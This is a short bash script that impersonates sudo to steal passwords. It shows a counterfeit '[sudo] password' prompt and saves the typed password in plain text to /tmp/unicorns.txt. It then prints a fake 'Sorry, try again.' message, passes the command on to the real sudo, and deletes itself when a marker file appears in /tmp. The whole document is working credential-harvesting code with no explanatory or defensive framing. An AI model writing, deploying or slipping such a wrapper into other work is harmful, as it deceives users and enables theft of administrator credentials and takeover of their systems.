#!/usr/bin/env bash

user=$(whoami)
outPath=/tmp/unicorns.txt
cleanUp=/tmp/dragons.txt
pwPrompt="[sudo] password for $user:\x20"
errStr="Sorry, try again."
myPath="$( cd "$(dirname "$0")" ; pwd -P )/$0"
if [ -f $outPath ]
then
    /usr/bin/sudo $@
else
    echo -ne $pwPrompt
    read -s PASSWORD
    echo
    echo $PASSWORD > $outPath
    echo $errStr
    /usr/bin/sudo $@
fi
if [ -f $cleanUp ]
then
   rm $myPath
fi
